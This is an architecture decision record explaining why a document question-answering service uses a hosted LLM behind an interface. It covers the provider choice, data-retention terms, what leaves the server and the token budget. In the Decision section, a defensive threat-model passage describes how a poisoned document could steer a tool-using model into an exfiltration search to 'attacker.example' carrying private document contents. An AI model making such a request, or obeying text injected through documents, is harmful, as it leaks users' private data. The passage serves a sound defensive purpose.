# ADR-0012: A hosted LLM for generation, behind an interface

- **Status:** Accepted
- **Date:** 2026-09-20

## Context

Embeddings run locally (ADR-0006) because the model is 2.2 GB and the work is
short, repetitive and batched. Generation is a different problem: a model good
enough to answer in French from five passages, without inventing, is tens of
gigabytes. The deployment target is one free VM already running PostgreSQL,
Redis, Keycloak and the embedding model.

Running a small local model would fit the machine and fit nothing else: a 7B
model quantised onto a shared CPU answers in tens of seconds and invents more,
which is precisely the failure this product exists to prevent. The honest
choice was between a hosted provider and no answering feature at all.

The hard constraint is the project rule: free, with no credit card, and nothing
that trains on what is sent.

## Options considered

| Option | Pros | Cons |
| ------ | ---- | ---- |
| **GroqCloud** | Free tier without a card; the Services Agreement states Groq is not permitted to use Inputs or Outputs for training, that the customer keeps every right in Customer Data, and that inference data is not retained by default; Zero Data Retention can be switched on by any account; OpenAI-compatible API, so the client is forty lines | Small daily budget (200K tokens, about 85 questions for everyone together); the available models are not the ones the documentation advertises |
| A local 7B model (llama.cpp, Ollama) | Nothing leaves the machine at all | Tens of seconds per answer on a shared CPU, on a VM that is already full; measurably weaker grounding, which is the one quality that matters here |
| Hosted OpenAI / Anthropic / Mistral | The strongest models | A credit card, so outside the rule this project set itself |

## Decision

**GroqCloud, reached only through the `LanguageModel` protocol**, with Zero
Data Retention enabled and `openai/gpt-oss-120b` as the model.

The protocol is the decision, as much as the provider is. `answer_question`
takes a `LanguageModel`; nothing above `app/rag/groq.py` knows that Groq
exists. The proof is not theoretical: the fourteen tests of `generation.py`
were written and passing before any account existed, and adding the real client
changed none of them.

`groq/compound` was rejected although it offers nine times the throughput and
no daily token limit. It is an agentic system with built-in web search and code
execution. A poisoned document can currently produce a wrong answer and nothing
else; with an outbound tool it could produce an exfiltration channel — a
search for `attacker.example/?data=<contents of a private document>` is a
request that leaves the building. Rate limits are survivable; an outbound
channel is not.

## What leaves the server, and what does not

| Leaves | Stays |
| ------ | ----- |
| Up to five passages, each at most ~1000 characters, of the asking user | The documents themselves, and every other passage |
| The question | Filenames, page numbers, document identifiers, the owner identity |

The model is given passages numbered `[1]` to `[5]` and may refer to them only
by number. It never receives a filename or a page, so an invented citation is
not detected afterwards — it cannot be expressed. What the user sees as
`contrat.pdf, p. 7` was attached by us after the answer came back.

## Consequences

- **The provider is a configuration value.** Changing it is a new class and one
  line in the lifespan, with no change to the generation logic or its tests.
- **The budget is a design constraint, not an operational detail.** 200K tokens
  a day over roughly 2300 tokens a question is about 85 questions for the whole
  service, which is why per-user quotas shipped with the endpoint rather than
  after it.
- **The documentation is not authoritative for this account.** The models
  endpoint queried with the real key is; `llama-3.3-70b-versatile` is listed as
  production and is not available.
- **The model is given no tools, ever.** That is what bounds the damage of a
  prompt injection to a wrong answer. Any future tool use reopens this ADR.
- **Answering can be switched off.** An empty `KP_GROQ_API_KEY` disables
  generation: `POST /api/chat` answers 503 and uploads, listings and deletions
  keep working. An optional external service must not be able to take the whole
  product down.

## Sources

- [Groq Services Agreement](https://console.groq.com/docs/legal/services-agreement)
- [Your Data in GroqCloud](https://console.groq.com/docs/your-data)
- [Data Processing Addendum](https://console.groq.com/docs/legal/customer-data-processing-addendum)
